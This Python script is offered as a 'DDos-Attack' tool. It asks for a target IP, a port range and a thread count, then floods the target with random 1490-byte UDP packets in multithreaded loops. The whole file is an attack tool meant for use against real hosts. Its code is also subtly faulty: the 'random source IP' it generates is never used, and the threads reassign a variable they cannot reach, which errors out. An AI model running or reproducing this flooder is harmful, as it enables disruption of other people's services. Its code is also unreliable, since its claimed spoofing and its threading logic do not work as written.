import sys
import os
import time
import socket
import random
from datetime import datetime
from threading import Thread, Lock

# Function to clear the screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to display progress
def progress_bar(percent):
    bar_length = 20
    filled = int(bar_length * percent / 100)
    bar = '=' * filled + '-' * (bar_length - filled)
    print(f"[{bar}] {percent}% ", end='\r')

# Function to generate random source IP
def random_source_ip():
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

# Main function
def main():
    clear_screen()
    print("Author    : Hiren Solanki")
    print("github     : https://github.com/HirenSolanki210/DDos-Attack.git")
    print("")

    try:
        ip = input("IP Target : ")
        port_start = int(input("Port Start : "))
        port_end = int(input("Port End   : "))
        num_threads = int(input("Number of Threads : "))
    except ValueError:
        print("\n[!] Invalid input. Please enter valid integers.")
        sys.exit()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    clear_screen()
    print("Attack Starting...")

    progress_bar(0)
    time.sleep(0.5)

    sent = 0
    port_range = port_end - port_start + 1
    start_time = time.time()

    # Thread-safe counter
    sent_lock = Lock()

    def attack_thread():
        nonlocal sent
        while True:
            try:
                src_ip = random_source_ip()
                sock.sendto(bytes, (ip, port_start))
                with sent_lock:
                    sent += 1
                print(f"Sent {sent} packets to {ip} through port {port_start}", end='\r')
                port_start = (port_start % port_range) + 1  # Wrap around port number
                elapsed_time = time.time() - start_time
                progress = (sent / (port_range * 1000)) * 100  # 1000 packets per port
                progress_bar(progress)
                time.sleep(0.001)
            except KeyboardInterrupt:
                print("\n[!] Stopped by user")
                break
            except Exception as e:
                print(f"\n[!] Error: {e}")
                break

    # Start multiple threads
    threads = []
    for _ in range(num_threads):
        t = Thread(target=attack_thread)
        t.start()
        threads.append(t)

    # Wait for all threads to finish
    for t in threads:
        t.join()

    print("\n[+] Attack completed.")

if __name__ == "__main__":
    main()
